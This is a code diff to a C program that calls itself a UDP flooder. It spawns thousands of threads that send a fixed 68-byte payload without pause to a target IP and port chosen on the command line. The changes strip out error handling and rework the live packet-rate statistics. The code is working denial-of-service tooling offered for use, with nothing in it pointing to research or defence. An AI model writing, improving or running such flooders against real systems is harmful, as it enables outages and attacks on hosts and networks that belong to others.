@@ -1,7 +1,6 @@
-// ultra.c – UDP flooder (macOS/Linux compatible)
+// ultra.c – UDP flooder with fixed live stats
 // Compile: gcc -pthread -O3 -o ultra ultra.c
 // Usage: ./ultra <IP> <PORT> <TIME_SEC> [THREADS]
-// Default: 2500 threads, 1500-byte packets
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -21,7 +20,7 @@ unsigned long long total_packets = 0;
 pthread_mutex_t counter_mutex = PTHREAD_MUTEX_INITIALIZER;
 time_t start_time;
 
-// Your custom payload (68 bytes)
+// Custom payload (68 bytes)
 const unsigned char original_payload[] = 
     "\x1\xfa\x83\x78\x4e\xc9\x25\x5d\xb7\x92\xfe\x67\xeb\x3a\x70\xb4"
     "\xde\xec\xbf\x09\x58\x86\x62\xb8\x58\x17\xb2\xcb\x1c\x8f\xae\x04"
@@ -61,31 +60,20 @@ void* send_loop(void* arg) {
     unsigned long long local_counter = 0;
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("Socket");
-        return NULL;
-    }
+    if (sock < 0) return NULL;
 
-    // Non-blocking for speed
     int flags = fcntl(sock, F_GETFL, 0);
     fcntl(sock, F_SETFL, flags | O_NONBLOCK);
 
     memset(&target, 0, sizeof(target));
     target.sin_family = AF_INET;
     target.sin_port = htons(data->port);
-    if (inet_pton(AF_INET, data->ip, &target.sin_addr) <= 0) {
-        perror("inet_pton");
-        close(sock);
-        return NULL;
-    }
+    inet_pton(AF_INET, data->ip, &target.sin_addr);
 
     time_t end_time = time(NULL) + data->duration;
 
     while (running && time(NULL) <= end_time) {
-        if (sendto(sock, full_payload, PACKET_SIZE, 0,
-                   (struct sockaddr*)&target, sizeof(target)) < 0) {
-            // ignore errors, keep sending
-        }
+        sendto(sock, full_payload, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
         local_counter++;
     }
 
@@ -94,14 +82,12 @@ void* send_loop(void* arg) {
     pthread_mutex_lock(&counter_mutex);
     total_packets += local_counter;
     pthread_mutex_unlock(&counter_mutex);
-
     return NULL;
 }
 
 int main(int argc, char* argv[]) {
     if (argc < 4 || argc > 5) {
         printf("Usage: %s <IP> <PORT> <TIME_SEC> [THREADS]\n", argv[0]);
-        printf("Default threads = %d, packet size = %d bytes\n", DEFAULT_THREADS, PACKET_SIZE);
         return 1;
     }
 
@@ -110,23 +96,14 @@ int main(int argc, char* argv[]) {
     char* ip = argv[1];
     int port = atoi(argv[2]);
     int duration = atoi(argv[3]);
-    int threads = DEFAULT_THREADS;
-
-    if (argc == 5) {
-        threads = atoi(argv[4]);
-        if (threads <= 0) threads = DEFAULT_THREADS;
-    }
-
-    if (duration <= 0 || port <= 0) {
-        printf("Error: PORT and TIME must be positive.\n");
-        return 1;
-    }
+    int threads = (argc == 5) ? atoi(argv[4]) : DEFAULT_THREADS;
+    if (threads <= 0) threads = DEFAULT_THREADS;
 
     signal(SIGINT, sigint_handler);
 
-    printf("\n╔════════════════════════════════════════════╗\n");
-    printf("║     UDP FLOODER (macOS/Linux compatible)   ║\n");
-    printf("╚════════════════════════════════════════════╝\n");
+    printf("\n╔════════════════════════════════════════╗\n");
+    printf("║     UDP FLOODER (fixed live stats)     ║\n");
+    printf("╚════════════════════════════════════════╝\n");
     printf("Target: %s:%d\n", ip, port);
     printf("Duration: %d sec | Threads: %d\n", duration, threads);
     printf("Packet size: %d bytes\n", PACKET_SIZE);
@@ -134,10 +111,6 @@ int main(int argc, char* argv[]) {
 
     pthread_t* tids = malloc(threads * sizeof(pthread_t));
     thread_data_t* thread_args = malloc(threads * sizeof(thread_data_t));
-    if (!tids || !thread_args) {
-        perror("malloc");
-        return 1;
-    }
 
     start_time = time(NULL);
     for (int i = 0; i < threads; i++) {
@@ -145,15 +118,12 @@ int main(int argc, char* argv[]) {
         thread_args[i].port = port;
         thread_args[i].duration = duration;
         thread_args[i].thread_id = i + 1;
-        if (pthread_create(&tids[i], NULL, send_loop, &thread_args[i]) != 0) {
-            perror("pthread_create");
-            free(tids);
-            free(thread_args);
-            return 1;
-        }
+        pthread_create(&tids[i], NULL, send_loop, &thread_args[i]);
     }
 
+    // Fixed live stats – wait 1 sec then report every second
     unsigned long long last_total = 0;
+    sleep(1);  // allow threads to start
     while (running && (time(NULL) - start_time) < duration) {
         sleep(1);
         unsigned long long current;
@@ -166,13 +136,14 @@ int main(int argc, char* argv[]) {
         fflush(stdout);
         last_total = current;
     }
+    printf("\n");
 
     running = 0;
     for (int i = 0; i < threads; i++) {
         pthread_join(tids[i], NULL);
     }
 
-    printf("\n\n========================================\n");
+    printf("\n========================================\n");
     printf("✅ Final: %llu packets in %d sec\n", total_packets, duration);
     if (duration > 0) printf("Average rate: %llu pps\n", total_packets / duration);
     printf("========================================\n");
